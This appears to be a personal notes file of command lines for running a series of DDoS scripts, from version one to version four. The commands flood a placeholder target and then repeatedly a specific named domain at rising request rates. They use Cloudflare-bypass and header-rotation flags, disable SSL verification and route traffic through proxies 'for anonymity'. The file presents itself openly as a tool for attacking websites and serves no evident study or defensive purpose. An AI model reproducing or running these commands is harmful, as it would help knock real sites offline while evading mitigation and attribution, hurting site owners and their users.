pip install aiohttp
python3 ddos.py --duration 60 --concurrency 100 --delay 0.5 --verbose

v2 
python3 ddos.py --ramp 10,25,50,100 --stage-duration 100 --concurrency 50

v3
Single Command - One Liner (Simplest Fast)
python3 ddosv2_cf_bypass.py --url https://target-site.com --bypass-cloudflare --rotate-headers --concurrency 1000 --ramp 100,200,300 --stage-duration 3 --retries 0 --no-dashboard --no-ssl-verify

With Proxy Support (For Anonymity + Speed)
python3 ddosv2_cf_bypass.py \
  --url https://target-site.com \
  --bypass-cloudflare \
  --rotate-headers \
  --concurrency 1000 \
  --ramp 50,100,150,200 \
  --stage-duration 3 \
  --retries 1 \
  --warmup 0 \
  --no-dashboard \
  --no-ssl-verify \
  --proxy http://your-proxy:8080 \
  --timeout 3



v4
# Basic (No error)
python3 ddosv4.py --url https://genggi.com --bypass-cloudflare --rotate-headers --concurrency 1000 --ramp 50,100,150,200 --stage-duration 3 --retries 0 --no-dashboard --no-ssl-verify

# With 300 RPS (Working na!)
python3 ddosv4.py --url https://genggi.com --bypass-cloudflare --rotate-headers --concurrency 1000 --ramp 100,200,300 --stage-duration 3 --retries 0 --no-dashboard --no-ssl-verify

# Higher RPS (500)
python3 ddosv4.py --url https://genggi.com --bypass-cloudflare --rotate-headers --concurrency 1000 --ramp 100,200,300,400,500 --stage-duration 3 --retries 0 --no-dashboard --no-ssl-verify

# Super Fast
python3 ddosv4.py --url https://genggi.com --bypass-cloudflare --rotate-headers --concurrency 2000 --ramp 200,300,400,500 --stage-duration 2 --retries 0 --warmup 0 --no-dashboard --no-ssl-verify
